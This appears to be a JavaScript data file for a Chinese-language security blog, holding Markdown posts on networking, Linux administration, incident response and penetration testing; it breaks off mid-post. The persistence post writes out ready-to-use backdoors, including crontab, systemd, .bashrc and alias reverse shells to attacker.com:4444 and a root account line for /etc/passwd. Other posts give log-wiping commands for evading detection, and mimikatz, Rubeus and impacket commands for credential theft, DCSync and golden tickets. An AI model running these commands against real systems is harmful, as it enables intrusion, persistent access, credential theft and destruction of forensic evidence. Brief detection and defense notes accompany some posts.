export const categories = [
  {
    id: 'network',
    name: '计算机网络',
    icon: '🌐',
    children: [
      { id: 'tcp-ip', name: 'TCP/IP 基础' },
      { id: 'http-https', name: 'HTTP/HTTPS 协议' },
      { id: 'dns', name: 'DNS 解析原理' },
      { id: 'wireshark', name: 'Wireshark 抓包' },
    ]
  },
  {
    id: 'linux',
    name: 'Linux 系统',
    icon: '🐧',
    children: [
      { id: 'linux-commands', name: '常用命令速查' },
      { id: 'linux-users', name: '用户与权限管理' },
      { id: 'linux-process', name: '进程与服务管理' },
      { id: 'linux-network', name: '网络配置管理' },
    ]
  },
  {
    id: 'websec',
    name: 'Web 安全',
    icon: '🔒',
    children: [
      { id: 'sqli', name: 'SQL 注入' },
      { id: 'xss', name: 'XSS 跨站脚本' },
      { id: 'upload', name: '文件上传漏洞' },
      { id: 'rce', name: '命令执行漏洞' },
      { id: 'csrf', name: 'CSRF 请求伪造' },
      { id: 'xxe', name: 'XXE 注入' },
    ]
  },
  {
    id: 'attack-defense',
    name: '攻防对抗',
    icon: '⚔️',
    children: [
      { id: 'recon', name: '信息收集' },
      { id: 'privesc', name: '权限提升' },
      { id: 'persistence', name: '权限维持' },
      { id: 'lateral', name: '横向移动' },
      { id: 'anti-forensics', name: '反溯源' },
    ]
  },
  {
    id: 'domain',
    name: '域渗透',
    icon: '🏢',
    children: [
      { id: 'domain-basic', name: '域环境基础' },
      { id: 'domain-recon', name: '域信息收集' },
      { id: 'domain-attack', name: '域控攻击' },
      { id: 'domain-techniques', name: '常见攻击手法' },
    ]
  },
  {
    id: 'ir',
    name: '应急响应',
    icon: '🚨',
    children: [
      { id: 'ir-process', name: '事件处理流程' },
      { id: 'ir-linux', name: 'Linux 应急响应' },
      { id: 'ir-windows', name: 'Windows 应急响应' },
    ]
  },
  {
    id: 'tools',
    name: '工具手册',
    icon: '🛠️',
    children: [
      { id: 'nmap', name: 'Nmap' },
      { id: 'burpsuite', name: 'BurpSuite' },
      { id: 'sqlmap', name: 'SQLmap' },
      { id: 'nuclei', name: 'Nuclei' },
      { id: 'cobaltstrike', name: 'CobaltStrike' },
      { id: 'wireshark-tool', name: 'Wireshark' },
    ]
  },
  {
    id: 'websec-advanced',
    name: 'Web安全进阶',
    icon: '🔐',
    children: [
      { id: 'deserialization', name: '反序列化漏洞' },
      { id: 'ssrf', name: 'SSRF 服务端请求伪造' },
      { id: 'logic-vuln', name: '逻辑漏洞' },
      { id: 'api-security', name: 'API 安全' },
      { id: 'wasm', name: 'WebAssembly 逆向' },
    ]
  },
  {
    id: 'mobile',
    name: '移动端安全',
    icon: '📱',
    children: [
      { id: 'android-reverse', name: 'Android 逆向' },
      { id: 'android-pentest', name: 'Android 渗透测试' },
      { id: 'ios-reverse', name: 'iOS 逆向基础' },
      { id: 'miniapp-pentest', name: '小程序渗透' },
    ]
  },
  {
    id: 'cloud',
    name: '云安全',
    icon: '☁️',
    children: [
      { id: 'aws-security', name: 'AWS 安全配置' },
      { id: 'docker-security', name: 'Docker 安全' },
      { id: 'k8s-security', name: 'Kubernetes 安全' },
      { id: 'container-escape', name: '容器逃逸' },
    ]
  },
  {
    id: 'crypto',
    name: '密码学',
    icon: '🔐',
    children: [
      { id: 'crypto-basic', name: '密码学基础' },
      { id: 'hash-crack', name: '哈希与破解' },
      { id: 'symmetric-crypto', name: '对称加密' },
      { id: 'asymmetric-crypto', name: '非对称加密' },
    ]
  },
  {
    id: 're',
    name: '逆向工程',
    icon: '🔬',
    children: [
      { id: 're-basic', name: '逆向基础' },
      { id: 'x86-asm', name: 'x86 汇编' },
      { id: 'ida-pro', name: 'IDA Pro 使用' },
      { id: 'ghidra', name: 'Ghidra 使用' },
    ]
  },
  {
    id: 'internal',
    name: '内网渗透',
    icon: '🌐',
    children: [
      { id: 'internal-recon', name: '内网信息收集' },
      { id: 'proxy-tunnel', name: '代理与隧道' },
      { id: 'internal-post', name: '后渗透' },
      { id: 'apt', name: 'APT 攻击' },
    ]
  },
  {
    id: 'securedev',
    name: '安全开发',
    icon: '💻',
    children: [
      { id: 'secure-coding', name: '安全编码规范' },
      { id: 'devsecops', name: 'DevSecOps' },
      { id: 'sast-dast', name: 'SAST/DAST' },
    ]
  },
  {
    id: 'redteam',
    name: '红队技术',
    icon: '🎯',
    children: [
      { id: 'c2-framework', name: 'C2 框架' },
      { id: 'evasion', name: '免杀技术' },
      { id: 'social-eng', name: '社会工程学' },
      { id: 'webshell', name: 'Webshell 技术' },
    ]
  },
  {
    id: 'vuln-analysis',
    name: '漏洞分析',
    icon: '🔍',
    children: [
      { id: 'cve-analysis', name: 'CVE 漏洞分析' },
      { id: 'heap-overflow', name: '堆溢出利用' },
      { id: 'rop', name: 'ROP 技术' },
      { id: 'kernel-exploit', name: '内核漏洞利用' },
    ]
  },
  {
    id: 'ctf',
    name: 'CTF 竞赛',
    icon: '🏆',
    children: [
      { id: 'ctf-web', name: 'Web 方向' },
      { id: 'ctf-pwn', name: 'PWN 方向' },
      { id: 'ctf-re', name: '逆向方向' },
      { id: 'ctf-crypto', name: '密码学方向' },
    ]
  },
]

export const posts = [
  // 计算机网络 - DNS
  {
    slug: 'dns-resolution',
    title: 'DNS 解析原理详解',
    date: '2026-06-17',
    category: 'network',
    subcategory: 'dns',
    tags: ['网络', 'DNS', '基础'],
    summary: 'DNS 解析流程、记录类型、常见攻击和安全配置。',
    content: `
## 什么是 DNS

DNS（Domain Name System）域名系统，将域名转换为 IP 地址。

## 解析流程

1. **浏览器缓存** → 2. **系统缓存** → 3. **hosts 文件** → 4. **本地 DNS 服务器** → 5. **根域名服务器** → 6. **顶级域名服务器** → 7. **权威域名服务器**

## 记录类型

| 记录 | 说明 | 示例 |
|------|------|------|
| A | 域名 → IPv4 | example.com → 93.184.216.34 |
| AAAA | 域名 → IPv6 | |
| CNAME | 别名记录 | www → example.com |
| MX | 邮件服务器 | |
| NS | 域名服务器 | |
| TXT | 文本记录 | SPF/DKIM |
| SRV | 服务记录 | |
| PTR | 反向解析 | IP → 域名 |

## DNS 工具

\`\`\`bash
# 查询 A 记录
nslookup example.com
dig example.com A

# 查询所有记录
dig example.com ANY

# 指定 DNS 服务器
dig @8.8.8.8 example.com

# 反向解析
dig -x 93.184.216.34

# 追踪解析过程
dig +trace example.com
\`\`\`

## DNS 安全

### DNS 劫持
攻击者篡改 DNS 响应，将用户引导到恶意网站。

### DNS 缓存投毒
污染 DNS 缓存，使后续查询返回错误结果。

### 防御
- 使用 DNSSEC
- 使用 DoH（DNS over HTTPS）
- 使用 DoT（DNS over TLS）
    `
  },
  {
    slug: 'wireshark-capture',
    title: 'Wireshark 抓包分析指南',
    date: '2026-06-16',
    category: 'network',
    subcategory: 'wireshark',
    tags: ['网络', 'Wireshark', '流量分析'],
    summary: 'Wireshark 抓包工具的使用方法和过滤技巧。',
    content: `
## Wireshark 简介

Wireshark 是最流行的网络协议分析器，支持深度包检测。

## 基本操作

### 开始抓包
1. 选择网卡
2. 点击开始按钮
3. 设置捕获过滤器

### 停止抓包
点击停止按钮或 Ctrl+E

## 显示过滤器

### 协议过滤
\`\`\`
http
tcp
dns
icmp
\`\`\`

### IP 过滤
\`\`\`
ip.addr == 192.168.1.1
ip.src == 192.168.1.1
ip.dst == 10.0.0.1
\`\`\`

### 端口过滤
\`\`\`
tcp.port == 80
tcp.dstport == 443
udp.port == 53
\`\`\`

### HTTP 过滤
\`\`\`
http.request.method == "POST"
http.response.code == 200
http.host contains "example"
http.url contains "login"
\`\`\`

### TCP 过滤
\`\`\`
tcp.flags.syn == 1
tcp.flags.rst == 1
tcp.stream eq 5
\`\`\`

### 组合过滤
\`\`\`
http && ip.src == 192.168.1.1
(tcp.port == 80 || tcp.port == 443) && http
\`\`\`

## 常用分析技巧

### 追踪 TCP 流
右键 → Follow → TCP Stream

### 提取文件
File → Export Objects → HTTP/DICOM/SMB/TFTP

### 统计信息
Statistics → Conversations / Protocol Hierarchy / Endpoints

## 实战场景

### 分析 HTTP 请求
\`\`\`
http.request.method == "POST" && http.request.uri contains "login"
\`\`\`

### 捕获密码
\`\`\`
http.request.method == "POST"
# 然后 Follow TCP Stream 查看明文
\`\`\`

### DNS 查询
\`\`\`
dns.qry.name contains "example"
\`\`\`
    `
  },
  // Linux 系统
  {
    slug: 'linux-commands',
    title: 'Linux 常用命令速查',
    date: '2026-06-20',
    category: 'linux',
    subcategory: 'linux-commands',
    tags: ['Linux', '命令', '基础'],
    summary: '渗透测试和日常运维中最常用的 Linux 命令。',
    content: `
## 文件操作

\`\`\`bash
ls -la          # 列出文件（含隐藏）
cd /path        # 切换目录
pwd             # 当前目录
mkdir -p dir    # 创建目录
cp -r src dst   # 复制
mv src dst      # 移动/重命名
rm -rf dir      # 删除
find / -name "*.conf"  # 查找文件
locate filename # 快速查找
\`\`\`

## 文件内容

\`\`\`bash
cat file        # 查看文件
less file       # 分页查看
head -n 20 file # 前20行
tail -f file    # 实时查看
grep "pattern" file  # 搜索
grep -rn "keyword" /path  # 递归搜索
wc -l file      # 统计行数
\`\`\`

## 权限管理

\`\`\`bash
chmod 755 file  # 修改权限
chown user:group file  # 修改所有者
sudo command    # 以root执行
su - user       # 切换用户
\`\`\`

## 网络相关

\`\`\`bash
ifconfig / ip a # 查看IP
netstat -tlnp   # 查看端口
ss -tlnp        # 查看端口（新）
curl url        # HTTP请求
wget url        # 下载
ping host       # 测试连通
traceroute host # 路由追踪
\`\`\`

## 进程管理

\`\`\`bash
ps aux          # 查看进程
top / htop      # 实时进程
kill -9 PID     # 强制结束
nohup cmd &     # 后台运行
crontab -e      # 定时任务
\`\`\`

## 压缩解压

\`\`\`bash
tar -czf archive.tar.gz dir/  # 压缩
tar -xzf archive.tar.gz       # 解压
unzip file.zip                 # 解压zip
\`\`\`

## 常用组合

\`\`\`bash
# 查找SUID文件
find / -perm -4000 2>/dev/null

# 查找可写目录
find / -writable -type d 2>/dev/null

# 查看历史命令
history | grep "keyword"

# 批量杀进程
killall process_name
\`\`\`
    `
  },
  {
    slug: 'linux-users',
    title: 'Linux 用户与权限管理',
    date: '2026-06-19',
    category: 'linux',
    subcategory: 'linux-users',
    tags: ['Linux', '权限', '用户管理'],
    summary: 'Linux 用户管理、文件权限、sudo 配置和提权方法。',
    content: `
## 用户管理

\`\`\`bash
useradd username    # 创建用户
passwd username     # 设置密码
userdel username    # 删除用户
usermod -aG sudo username  # 添加到sudo组
id username         # 查看用户信息
whoami              # 当前用户
\`\`\`

## 文件权限

### 权限说明
\`\`\`
-rwxr-xr--
│└┬┘└┬┘└┬┘
│ │  │  └── 其他用户：读
│ │  └───── 所属组：读+执行
│ └──────── 所有者：读+写+执行
└────────── 文件类型（-普通 d目录 l链接）
\`\`\`

### 修改权限
\`\`\`bash
chmod 755 file      # rwxr-xr-x
chmod u+x file      # 所有者加执行
chmod g-w file      # 组去掉写
chmod o-rwx file    # 其他无权限
\`\`\`

### 特殊权限
\`\`\`bash
chmod u+s file      # SUID：执行时以所有者身份
chmod g+s dir       # SGID：目录下新文件继承组
chmod +t dir        # Sticky Bit：只有所有者能删除
\`\`\`

## SUID 提权

\`\`\`bash
# 查找SUID文件
find / -perm -4000 2>/dev/null

# 常见可提权SUID
/usr/bin/find -exec /bin/sh \\;
/usr/bin/vim -c ':!sh'
/usr/bin/nmap --interactive
\`\`\`

## sudo 配置

\`\`\`bash
# 查看sudo权限
sudo -l

# 编辑sudoers
visudo

# 允许执行特定命令
username ALL=(ALL) /usr/bin/vim
\`\`\`

## /etc/passwd 和 /etc/shadow

\`\`\`bash
# passwd 可读，包含用户信息
cat /etc/passwd

# shadow 包含密码哈希（需root）
cat /etc/shadow
\`\`\`
    `
  },
  {
    slug: 'linux-process',
    title: 'Linux 进程与服务管理',
    date: '2026-06-18',
    category: 'linux',
    subcategory: 'linux-process',
    tags: ['Linux', '进程', '服务'],
    summary: 'Linux 进程管理、服务配置和定时任务。',
    content: `
## 进程管理

\`\`\`bash
ps aux              # 查看所有进程
ps -ef              # 完整格式
top                 # 实时进程
htop                # 增强版top
pstree              # 进程树
\`\`\`

## 进程操作

\`\`\`bash
kill PID            # 终止进程（SIGTERM）
kill -9 PID         # 强制终止（SIGKILL）
killall name        # 按名称终止
pkill name          # 按模式终止
nohup cmd &         # 后台运行
jobs                # 查看后台任务
fg %1               # 调回前台
\`\`\`

## Systemd 服务

\`\`\`bash
systemctl status service     # 查看状态
systemctl start service      # 启动
systemctl stop service       # 停止
systemctl restart service    # 重启
systemctl enable service     # 开机启动
systemctl disable service    # 禁用开机启动
systemctl list-units --type=service  # 列出服务
\`\`\`

## 定时任务 Crontab

\`\`\`bash
crontab -e          # 编辑定时任务
crontab -l          # 查看定时任务

# 格式：分 时 日 月 周 命令
# 每天凌晨3点执行
0 3 * * * /path/to/script.sh

# 每5分钟执行
*/5 * * * * /path/to/script.sh

# 每周一执行
0 0 * * 1 /path/to/script.sh
\`\`\`

## 日志管理

\`\`\`bash
# 常见日志位置
/var/log/syslog          # 系统日志
/var/log/auth.log        # 认证日志
/var/log/apache2/        # Apache日志
/var/log/nginx/          # Nginx日志
\`\`\`

## 开机启动项

\`\`\`bash
# 查看启动服务
systemctl list-unit-files --type=service

# 查看rc.local
cat /etc/rc.local
\`\`\`
    `
  },
  {
    slug: 'linux-network',
    title: 'Linux 网络配置管理',
    date: '2026-06-17',
    category: 'linux',
    subcategory: 'linux-network',
    tags: ['Linux', '网络', '配置'],
    summary: 'Linux 网络配置、防火墙、VPN 和流量管理。',
    content: `
## 网络配置

\`\`\`bash
ip addr              # 查看IP地址
ip link              # 查看网络接口
ip route             # 查看路由表
ifconfig             # 传统方式（部分系统）
\`\`\`

## 端口管理

\`\`\`bash
netstat -tlnp        # 查看监听端口
ss -tlnp             # 更快的方式
lsof -i :80          # 查看端口占用
\`\`\`

## 防火墙

### iptables
\`\`\`bash
iptables -L -n       # 查看规则
iptables -A INPUT -p tcp --dport 80 -j ACCEPT  # 允许80端口
iptables -A INPUT -j DROP  # 默认拒绝
\`\`\`

### firewalld
\`\`\`bash
firewall-cmd --state          # 状态
firewall-cmd --list-all       # 查看规则
firewall-cmd --add-port=80/tcp --permanent  # 开放端口
firewall-cmd --reload         # 重载
\`\`\`

## DNS 配置

\`\`\`bash
# /etc/resolv.conf
nameserver 8.8.8.8
nameserver 114.114.114.114
\`\`\`

## hosts 文件

\`\`\`bash
# /etc/hosts
127.0.0.1 localhost
192.168.1.100 target.com
\`\`\`

## 网络诊断

\`\`\`bash
ping host           # 连通性测试
traceroute host     # 路由追踪
nslookup domain     # DNS查询
dig domain          # 详细DNS查询
curl -v url         # HTTP调试
tcpdump -i eth0     # 抓包
\`\`\`

## SSH 配置

\`\`\`bash
ssh user@host               # 连接
ssh -p 2222 user@host       # 指定端口
scp file user@host:/path    # 传输文件
ssh-keygen -t rsa           # 生成密钥
ssh-copy-id user@host       # 复制公钥
\`\`\`
    `
  },
  // 攻防对抗 - 补充
  {
    slug: 'persistence-techniques',
    title: '权限维持技术',
    date: '2026-06-07',
    category: 'attack-defense',
    subcategory: 'persistence',
    tags: ['渗透测试', '权限维持', '后门'],
    summary: '常见权限维持方法和后门技术。',
    content: `
## 权限维持方法

### 1. SSH 公钥后门

\`\`\`bash
# 写入公钥
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
\`\`\`

### 2. Crontab 定时任务

\`\`\`bash
# 每分钟执行反弹shell
* * * * * /bin/bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"
\`\`\`

### 3. Systemd 服务

\`\`\`ini
# /etc/systemd/system/backdoor.service
[Unit]
Description=System Service

[Service]
Type=simple
ExecStart=/bin/bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"
Restart=always

[Install]
WantedBy=multi-user.target
\`\`\`

### 4. .bashrc 后门

\`\`\`bash
# ~/.bashrc
if [[ $- != *i* ]]; then
    /bin/bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1" &
fi
\`\`\`

### 5. 命令别名

\`\`\`bash
# ~/.bashrc
alias ls='ls; /bin/bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1" &'
\`\`\`

### 6. SUID 后门

\`\`\`bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
\`\`\`

### 7. /etc/passwd 后门

\`\`\`bash
# 添加一个uid=0的用户
echo 'hacker:$6$xxx:0:0::/root:/bin/bash' >> /etc/passwd
\`\`\`

## Windows 权限维持

### 注册表自启动

\`\`\`powershell
HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
\`\`\`

### 计划任务

\`\`\`powershell
schtasks /create /tn "backdoor" /tr "C:\\backdoor.exe" /sc minute /mo 1
\`\`\`

### 服务后门

\`\`\`powershell
sc create backdoor binPath= "C:\\backdoor.exe" start= auto
\`\`\`

## 检测方法

- 检查 Crontab 异常任务
- 检查 /etc/passwd 新用户
- 检查 SUID 文件
- 检查异常进程
- 检查启动项
    `
  },
  {
    slug: 'lateral-movement',
    title: '横向移动技术',
    date: '2026-06-06',
    category: 'attack-defense',
    subcategory: 'lateral',
    tags: ['渗透测试', '横向移动', '内网'],
    summary: '内网横向移动的常见方法和工具。',
    content: `
## 横向移动方法

### 1. IPC$ 命名管道

\`\`\`cmd
# 连接
net use \\\\target\\ipc$ "password" /user:administrator

# 复制文件
copy shell.exe \\\\target\\C$\\Windows\\Temp\\

# 执行
sc \\\\target create service binPath= "C:\\Windows\\Temp\\shell.exe"
\`\`\`

### 2. PsExec

\`\`\`cmd
psexec \\\\target -u admin -p pass cmd.exe
psexec \\\\target -u admin -p pass -c shell.exe
\`\`\`

### 3. WMI

\`\`\`cmd
wmic /node:target /user:admin /password:pass process call create "cmd.exe /c whoami > C:\\temp\\out.txt"
\`\`\`

### 4. WinRM

\`\`\`powershell
# 远程执行
Invoke-Command -ComputerName target -ScriptBlock { whoami }
\`\`\`

### 5. RDP

\`\`\`cmd
mstsc /v:target
xfreerdp /v:target /u:admin /p:pass
\`\`\`

### 6. SMB

\`\`\`cmd
# 使用 impacket
psexec.py admin:pass@target
wmiexec.py admin:pass@target
smbexec.py admin:pass@target
\`\`\`

### 7. Pass the Hash

\`\`\`cmd
# 使用 mimikatz 获取哈希
sekurlsa::logonpasswords

# 使用哈希连接
psexec.py -hashes aad3b435...:f1f4d... admin@target
\`\`\`

## 工具

- **Impacket**：Python 网络协议工具包
- **CrackMapExec**：批量内网渗透
- **BloodHound**：AD 环境分析
- **Responder**：LLMNR/NBT-NS 欺骗

## 检测

- 监控异常登录
- 检查日志中的横向移动特征
- 网络流量分析
    `
  },
  {
    slug: 'anti-forensics',
    title: '反溯源与日志清理',
    date: '2026-06-04',
    category: 'attack-defense',
    subcategory: 'anti-forensics',
    tags: ['渗透测试', '反溯源', '日志'],
    summary: '渗透测试中的反溯源技术日志清理方法。',
    content: `
## 反溯源方法

### 1. 使用代理/VPS

\`\`\`bash
# 使用 proxychains
proxychains nmap -sV target.com

# SSH 代理
ssh -D 1080 user@vps
\`\`\`

### 2. 修改 MAC 地址

\`\`\`bash
ifconfig eth0 hw ether 00:11:22:33:44:55
macchanger -r eth0
\`\`\`

### 3. 修改主机名

\`\`\`bash
hostnamectl set-hostname random-name
\`\`\`

### 4. 使用临时工具

\`\`\`bash
# 在 /tmp 下操作，重启后自动清理
cd /tmp
\`\`\`

## 日志清理

### Linux 日志

\`\`\`bash
# 清除登录日志
echo > /var/log/auth.log
echo > /var/log/secure

# 清除命令历史
history -c
unset HISTFILE
rm ~/.bash_history

# 清除特定日志条目
sed -i '/attacker_ip/d' /var/log/auth.log

# 清除 utmp/wtmp/btmp
echo > /var/log/wtmp
echo > /var/log/btmp
\`\`\`

### Windows 日志

\`\`\`powershell
# 清除安全日志
wevtutil cl Security

# 清除系统日志
wevtutil cl System

# 清除应用日志
wevtutil cl Application

# PowerShell 历史
Remove-Item (Get-PSReadLineOption).HistorySavePath
\`\`\`

## 时间戳修改

\`\`\`bash
# 修改文件时间戳
touch -r reference_file target_file
timestomp target_file -m "01/01/2020 00:00:00"
\`\`\`

## 注意事项

- 不要清理所有日志（会触发告警）
- 只删除特定条目
- 保留正常日志结构
- 注意文件时间戳
    `
  },
  // 域渗透 - 补充
  {
    slug: 'domain-recon',
    title: '域信息收集',
    date: '2026-05-24',
    category: 'domain',
    subcategory: 'domain-recon',
    tags: ['域渗透', '信息收集', 'Active Directory'],
    summary: '域环境下的信息收集方法和工具。',
    content: `
## 基本信息

\`\`\`powershell
# 当前域信息
net config workstation
nltest /dclist:domain.com
nltest /domain_trusts

# 域用户
net user /domain

# 域组
net group /domain
net group "Domain Admins" /domain

# 域控
nslookup -type=SRV _ldap._tcp.dc._msdcs.domain.com
\`\`\`

## LDAP 查询

\`\`\`powershell
# 使用 ldapsearch
ldapsearch -x -h domain.com -b "DC=domain,DC=com"

# 使用 PowerShell
Get-ADUser -Filter * -Properties *
Get-ADComputer -Filter * -Properties *
Get-ADGroup -Filter *
\`\`\`

## BloodHound

\`\`\`bash
# 数据收集
bloodhound-python -u admin -p pass -d domain.com -c All

# SharpHound
./SharpHound.exe -c All
\`\`\`

## 常用工具

- **enum4linux**：SMB 枚举
- **ldapsearch**：LDAP 查询
- **BloodHound**：AD 路径分析
- **ADRecon**：AD 环境报告

## 信息收集内容

1. 域名、域 SID
2. 域控制器列表
3. 域用户和组
4. 信任关系
5. 共享资源
6. 策略配置
    `
  },
  {
    slug: 'domain-attack',
    title: '域控攻击技术',
    date: '2026-05-23',
    category: 'domain',
    subcategory: 'domain-attack',
    tags: ['域渗透', '域控', 'Active Directory'],
    summary: '获取域控制器权限的常见方法。',
    content: `
## 域控攻击方法

### 1. Kerberoasting

\`\`\`powershell
# 请求服务票据
Add-Type -AssemblyName System.IdentityModel
$spns = Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
foreach ($spn in $spns) {
    New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentName $spn.ServicePrincipalName
}

# 使用 Rubeus
Rubeus.exe kerberoast /outfile:hashes.txt
\`\`\`

### 2. AS-REP Roasting

\`\`\`powershell
# 查找不需要预认证的用户
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth

# 使用 Rubeus
Rubeus.exe asreproast /outfile:hashes.txt
\`\`\`

### 3. Pass the Hash

\`\`\`cmd
# 使用 mimikatz
sekurlsa::logonpasswords
lsadump::lsa /patch

# 使用 impacket
psexec.py -hashes aad3b435...:f1f4d... administrator@dc.domain.com
\`\`\`

### 4. DCSync

\`\`\`powershell
# 使用 mimikatz
lsadump::dcsync /user:krbtgt

# 使用 impacket
secretsdump.py domain/admin:pass@dc.domain.com -just-dc-ntlm
\`\`\`

### 5. Golden Ticket

\`\`\`powershell
# 需要 krbtgt 哈希
kerberos::golden /user:administrator /domain:domain.com /sid:S-1-5-21-... /krbtgt:hash /ticket:golden.kirbi
\`\`\`

## 防御

- 监控异常 SPN 请求
- 限制 DCSync 权限
- 定期更改 krbtgt 密码
- 启用 LAPS
    `
  },
  {
    slug: 'domain-techniques',
    title: '域渗透常见攻击手法',
    date: '2026-05-22',
    category: 'domain',
    subcategory: 'domain-techniques',
    tags: ['域渗透', 'Kerberos', 'NTLM'],
    summary: '域渗透中的常见攻击技术和利用方法。',
    content: `
## Kerberos 攻击

### Pass the Ticket

\`\`\`powershell
# 导出票据
mimikatz # kerberos::list /export

# 导入票据
mimikatz # kerberos::ptt ticket.kirbi
\`\`\`

### Silver Ticket

\`\`\`powershell
# 伪造服务票据
mimikatz # kerberos::golden /user:admin /domain:domain.com /sid:S-1-5-21-... /target:server.domain.com /service:http /rc4:hash /ptt
\`\`\`

## NTLM 攻击

### NTLM Relay

\`\`\`bash
# 使用 impacket
ntlmrelayx.py -t dc.domain.com -smb2support

# 使用 Responder
responder -I eth0 -wrf
\`\`\`

### Pass the NTLM

\`\`\`cmd
# 使用 mimikatz
sekurlsa::pth /user:admin /domain:domain.com /ntlm:hash /run:cmd.exe
\`\`\`

## 委派攻击

### 非约束委派

\`\`\`powershell
# 查找配置非约束委派的机器
Get-ADComputer -Filter {TrustedForDelegation -eq $true}
\`\`\`

### 约束委派

\`\`\`powershell
# 查找约束委派
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
\`\`\`

## 常用工具

- **Rubeus**：Kerberos 攻击
- **Mimikatz**：凭据获取
- **Impacket**：网络协议攻击
- **Responder**：LLMNR/NBT-NS 欺骗
    `
  },
  // 应急响应 - 补充
  {
    slug: 'linux-ir',
    title: 'Linux 应急响应',
    date: '2026-05-27',
    category: 'ir',
    subcategory: 'ir-linux',
    tags: ['应急响应', 'Linux', '安全'],
    summary: 'Linux 系统安全事件应急响应流程。',
    content: `
## 排查步骤

### 1. 账户安全

\`\`\`bash
# 检查新增用户
cat /etc/passwd | grep -v nologin
awk -F: '$3==0{print $1}' /etc/passwd

# 检查密码文件
cat /etc/shadow

# 检查sudo配置
cat /etc/sudoers
\`\`\`

### 2. 进程排查

\`\`\`bash
# 查看异常进程
ps aux | grep -v root | sort -nrk 3 | head

# 查看网络连接进程
netstat -antlp | grep ESTABLISHED

# 查看可疑进程
ls -la /proc/PID/exe
\`\`\`

### 3. 文件排查

\`\`\`bash
# 查找最近修改的文件
find / -mtime -1 -type f

# 查找SUID文件
find / -perm -4000 -type f

# 查找可写目录
find / -writable -type d

# 检查/tmp目录
ls -la /tmp/
\`\`\`

### 4. 日志分析

\`\`\`bash
# 登录日志
last
lastb
lastlog

# 认证日志
grep "Failed password" /var/log/auth.log
grep "Accepted password" /var/log/auth.log
\`\`\`

### 5. 启动项

\`\`\`bash
# 检查crontab
crontab -l
ls -la /etc/cron*

# 检查systemd服务
systemctl list-unit-files --type=service
\`\`\`

## 常见攻击痕迹

- 异常进程
- 新增用户
- SUID 文件
- 异常计划任务
- 异常网络连接
    `
  },
  {
    slug: 'windows-ir',
    title: 'Windows 应急响应',
    date: '2026-05-26',
    category: 'ir',
    subcategory: 'ir-windows',
    tags: ['应急响应', 'Windows', '安全'],
    summary: 'Windows 系统安全事件应急响应流程。',
    content: `
## 排查步骤

### 1. 账户安全

\`\`\`powershell
# 查看用户
net user
net localgroup administrators

# 查看隐藏用户
reg query "HKLM\\SAM\\SAM\\Domains\\Account\\Users"

# 检查账户枚举
wmic useraccount list full
\`\`\`

### 2. 进程排查

\`\`\`powershell
# 查看进程
tasklist /v
Get-Process | Select-Object Id, ProcessName, Path

# 查看网络连接
netstat -ano | findstr ESTABLISHED

# 使用 Process Explorer
\`\`\`

### 3. 文件排查

\`\`\`powershell
# 查找最近修改的文件
forfiles /P C:\\ /S /D +0 /C "cmd /c echo @path @fdate @ftime"

# 检查启动目录
dir "C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
\`\`\`

### 4. 日志分析

\`\`\`powershell
# 安全日志
wevtutil qe Security /c:100 /f:text

# 登录事件ID
# 4624 - 登录成功
# 4625 - 登录失败
# 4648 - 明文登录
# 4720 - 创建用户
\`\`\`

### 5. 注册表排查

\`\`\`powershell
# 自启动项
reg query "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
reg query "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
\`\`\`

## 工具

- **Autoruns**：启动项分析
- **Process Explorer**：进程分析
- **Process Monitor**：行为监控
- **WinPEAS**：提权检查
    `
  },
  // 工具手册 - 补充
  {
    slug: 'sqlmap-guide',
    title: 'SQLmap 使用指南',
    date: '2026-05-30',
    category: 'tools',
    subcategory: 'sqlmap',
    tags: ['工具', 'SQLmap', 'SQL注入'],
    summary: 'SQLmap 自动化 SQL 注入检测和利用工具。',
    content: `
## 基本用法

\`\`\`bash
# 检测注入
sqlmap -u "http://target/?id=1"

# 获取数据库
sqlmap -u "http://target/?id=1" --dbs

# 获取表
sqlmap -u "http://target/?id=1" -D mydb --tables

# 获取数据
sqlmap -u "http://target/?id=1" -D mydb -T users --dump
\`\`\`

## POST 注入

\`\`\`bash
# 从 Burp 导出请求
sqlmap -r request.txt

# 指定参数
sqlmap -u "http://target/login" --data="user=admin&pass=123" -p user

# 指定方法
sqlmap -u "http://target/login" --data="user=admin&pass=123" --method=POST
\`\`\`

## 高级选项

\`\`\`bash
# 执行系统命令
sqlmap -u "http://target/?id=1" --os-shell

# 读取文件
sqlmap -u "http://target/?id=1" --file-read="/etc/passwd"

# 写入文件
sqlmap -u "http://target/?id=1" --file-write="shell.php" --file-dest="/var/www/shell.php"

# 使用代理
sqlmap -u "http://target/?id=1" --proxy="http://127.0.0.1:8080"

# 绕过WAF
sqlmap -u "http://target/?id=1" --tamper=space2comment,between --random-agent
\`\`\`

## Tamper 脚本

\`\`\`bash
# 常用tamper
space2comment     # 空格→注释
between           # >→BETWEEN, =→LIKE
charencode        # URL编码
randomcase        # 随机大小写
unionall          # UNION ALL替换UNION
\`\`\`

## 输出控制

\`\`\`bash
# 保存日志
sqlmap -u "http://target/?id=1" --output-dir=/tmp/sqlmap

# 只检测不利用
sqlmap -u "http://target/?id=1" --batch --level=1

# 指定数据库类型
sqlmap -u "http://target/?id=1" --dbms=mysql
\`\`\`
    `
  },
  {
    slug: 'nuclei-guide',
    title: 'Nuclei 漏洞扫描指南',
    date: '2026-05-28',
    category: 'tools',
    subcategory: 'nuclei',
    tags: ['工具', 'Nuclei', '漏洞扫描'],
    summary: 'Nuclei 基于模板的快速漏洞扫描器。',
    content: `
## 基本用法

\`\`\`bash
# 扫描单个目标
nuclei -u http://target.com

# 批量扫描
